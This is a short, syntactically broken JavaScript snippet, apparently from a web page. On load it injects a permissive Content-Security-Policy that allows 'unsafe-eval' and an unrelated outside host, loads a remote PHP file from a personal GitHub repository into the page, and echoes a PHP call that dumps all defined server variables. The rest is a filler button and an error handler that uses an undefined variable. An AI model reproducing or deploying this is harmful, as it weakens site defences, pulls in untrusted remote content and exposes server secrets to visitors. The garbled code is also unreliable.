  document.addEventListener('DOMContentLoaded', function() {
	      var meta = document.createElement('meta');
    meta.setAttribute('http-equiv', 'Content-Security-Policy');
    meta.setAttribute('content', "default-src *; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://ucilnica.pgdzgsiska.si");

    document.head.appendChild(meta);
	  $('#output').load('https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php');
	  var div = document.getElementById('ma');
	  	

    console.log("<?php print_r(get_defined_vars());?>");
    
    // If there's an error loading the image, display an error message
    img.onerror = function() {
      alert("Error loading image. Please check the URL and try again.");
    };
  }
            
    var button = document.createElement('button');
    button.textContent = 'Click Me';
    button.addEventListener('click', function() {
      alert('Button clicked!');
    });
    div.appendChild(button);
  });
